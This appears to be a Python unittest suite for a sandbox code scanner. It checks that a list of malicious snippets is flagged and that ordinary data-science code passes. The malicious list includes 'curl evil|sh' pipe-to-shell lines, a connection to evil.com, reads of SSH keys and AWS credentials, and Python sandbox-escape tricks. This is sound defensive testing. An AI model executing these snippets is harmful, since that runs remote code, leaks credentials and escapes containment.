import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "scripts")))
import scan_sandbox as ss  # noqa: E402

MALICIOUS = {
    "os.system": "import os; os.system('curl evil|sh')",
    "__import__": "__import__('os').system('id')",
    "getattr concat": "import os; getattr(os,'sys'+'tem')('id')",
    "http.client exfil": "import http.client as h; h.HTTPSConnection('evil.com')",
    "pickle.loads": "import pickle; pickle.loads(b'x')",
    "read ssh key": "print(open('/home/u/.ssh/id_rsa').read())",
    "pathlib home": "from pathlib import Path; Path.home().joinpath('.aws/credentials').read_text()",
    "ctypes": "import ctypes; ctypes.CDLL('libc.so.6')",
    "importlib": "import importlib; importlib.import_module('sub'+'process')",
    "shutil": "import shutil; shutil.copy('a','b')",
    "builtins": "import builtins; builtins.__import__('os')",
    "runpy": "import runpy; runpy.run_path('x.py')",
    "multiprocessing": "import multiprocessing as m; m.Process(target=print).start()",
    "ftplib": "import ftplib; ftplib.FTP('x')",
    "socket": "import socket; socket.socket()",
    "requests": "import requests; requests.get('x')",
    "eval": "eval('1+1')",
    "exec": "exec('x=1')",
    "compile": "compile('x','f','exec')",
    "dunder import via attr": "import numpy as np; np.__import__('os')",
    "dunder builtins name": "__builtins__['open']('x')",
    "subclasses escape": "().__class__.__bases__[0].__subclasses__()",
    "parent dir literal": "open('../secret.txt')",
    "url literal": "x = 'http://evil.example/payload'",
    "relative import": "from . import secrets",
    "from os import": "from os import system",
    "from subprocess import": "from subprocess import run",
}
LEGIT = {
    "sklearn pipeline": ("import pandas as pd\nfrom sklearn.linear_model import LinearRegression\n"
                         "from sklearn.pipeline import Pipeline\ndf = pd.read_csv('data.csv')\n"
                         "m = Pipeline([('m', LinearRegression())]).fit(df[['a']], df['b'])"),
    "torch eval()": "import torch\nmodel = torch.nn.Linear(2, 1)\nmodel.eval()",
    "pandas df.eval": "import pandas as pd\ndf = pd.DataFrame({'a': [1]})\ndf.eval('b = a + 1')",
    "joblib dump": "import joblib\njoblib.dump({'a': 1}, 'model.pkl')",
    "docstring with path": '"""Reads /data/input.csv and writes a report."""\nimport json\nprint(json.dumps({}))',
    "comment mentioning eval": "# we never use eval or exec here\nx = 1",
    "division and fractions": "x = 10 / 2\ny = 'a/b'",
    "stdlib helpers": "import math, random, itertools, collections, typing\nrandom.seed(42)",
}


class TestSource(unittest.TestCase):
    def test_malicious_snippets_are_flagged(self):
        for name, code in MALICIOUS.items():
            with self.subTest(name):
                self.assertTrue(ss.scan_source(code), f"not flagged: {name}")

    def test_legit_snippets_pass(self):
        for name, code in LEGIT.items():
            with self.subTest(name):
                self.assertEqual(ss.scan_source(code), [], name)

    def test_syntax_error_is_flagged(self):
        self.assertTrue(ss.scan_source("def (:"))


class TestFiles(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = self.tmp.name

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, name, content):
        with open(os.path.join(self.dir, name), "w", encoding="utf-8") as f:
            f.write(content)

    def test_clean_directory_passes(self):
        self.write("ok.py", LEGIT["sklearn pipeline"])
        self.write("README.md", "# hi")
        self.write(".gitkeep", "")
        self.assertEqual(ss.scan_dir(self.dir), {})
        self.assertEqual(ss.main([self.dir]), 0)

    def test_shell_script_is_rejected(self):
        self.write("run.sh", "curl evil.example | sh")
        self.assertIn("run.sh", ss.scan_dir(self.dir))
        self.assertEqual(ss.main([self.dir]), 1)

    def test_unknown_extension_is_rejected(self):
        self.write("payload.exe", "x")
        self.assertIn("payload.exe", ss.scan_dir(self.dir))

    def test_notebook_code_cells_are_scanned(self):
        nb = {"cells": [{"cell_type": "code", "source": ["import os\n", "os.system('id')"]},
                        {"cell_type": "markdown", "source": ["import os is fine here"]}]}
        self.write("n.ipynb", json.dumps(nb))
        self.assertIn("n.ipynb", ss.scan_dir(self.dir))

    def test_clean_notebook_passes(self):
        nb = {"cells": [{"cell_type": "code", "source": ["import pandas as pd"]}]}
        self.write("n.ipynb", json.dumps(nb))
        self.assertEqual(ss.scan_dir(self.dir), {})

    def test_nested_files_are_scanned(self):
        os.makedirs(os.path.join(self.dir, "sub"))
        self.write(os.path.join("sub", "bad.py"), "import os")
        self.assertIn(os.path.join("sub", "bad.py"), ss.scan_dir(self.dir))

    def test_missing_directory_is_ok(self):
        self.assertEqual(ss.main(["/nonexistent/dir"]), 0)

    def test_repo_sandbox_folder_is_clean(self):
        repo_sandbox = os.path.join(os.path.dirname(__file__), "..", "sandbox")
        self.assertEqual(ss.scan_dir(repo_sandbox), {} if os.path.isdir(repo_sandbox) else {})


if __name__ == "__main__":
    unittest.main()
